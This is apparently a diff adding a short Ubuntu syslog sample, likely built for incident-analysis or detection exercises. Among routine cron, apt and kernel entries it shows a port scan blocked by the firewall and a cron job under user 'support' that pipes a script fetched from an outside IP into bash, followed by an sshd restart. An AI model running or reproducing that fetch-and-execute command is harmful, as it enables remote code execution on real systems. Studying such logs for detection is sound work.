@@ -1,0 +1,16 @@
+Nov 19 07:55:01 ubuntu-srv CRON[980]: (root) CMD (/usr/local/bin/backup.sh)
+Nov 19 08:00:03 ubuntu-srv systemd[1]: Started Daily apt download activities.
+Nov 19 08:00:05 ubuntu-srv systemd[1]: apt-daily.service: Succeeded.
+Nov 19 10:12:44 ubuntu-srv kernel: [ 4021.552310] EXT4-fs (sda1): re-mounted. Opts: errors=remount-ro
+Nov 19 12:00:01 ubuntu-srv CRON[1250]: (root) CMD (/usr/local/bin/backup.sh)
+Nov 19 14:21:58 ubuntu-srv kernel: [ 9120.114201] UFW BLOCK IN=eth0 OUT= SRC=203.0.113.45 DST=10.0.0.5 PROTO=TCP SPT=44312 DPT=3389
+Nov 19 14:21:59 ubuntu-srv kernel: [ 9121.114388] UFW BLOCK IN=eth0 OUT= SRC=203.0.113.45 DST=10.0.0.5 PROTO=TCP SPT=44313 DPT=23
+Nov 19 14:22:00 ubuntu-srv kernel: [ 9122.114522] UFW BLOCK IN=eth0 OUT= SRC=203.0.113.45 DST=10.0.0.5 PROTO=TCP SPT=44314 DPT=3306
+Nov 19 14:26:10 ubuntu-srv CRON[1530]: (support) CMD (curl -s http://198.51.100.99/update.sh | bash)
+Nov 19 14:27:33 ubuntu-srv systemd[1]: Started Session 42 of user support.
+Nov 19 14:31:02 ubuntu-srv systemd[1]: ssh.service: Failed with result 'exit-code'.
+Nov 19 14:31:05 ubuntu-srv systemd[1]: ssh.service: Scheduled restart job, restart counter is at 1.
+Nov 19 14:31:05 ubuntu-srv systemd[1]: Stopped OpenBSD Secure Shell server.
+Nov 19 14:31:05 ubuntu-srv systemd[1]: Started OpenBSD Secure Shell server.
+Nov 19 16:00:01 ubuntu-srv CRON[1700]: (root) CMD (/usr/local/bin/backup.sh)
+Nov 19 17:45:12 ubuntu-srv kernel: [15012.882001] Out of memory: Killed process 2210 (java) total-vm:4096000kB
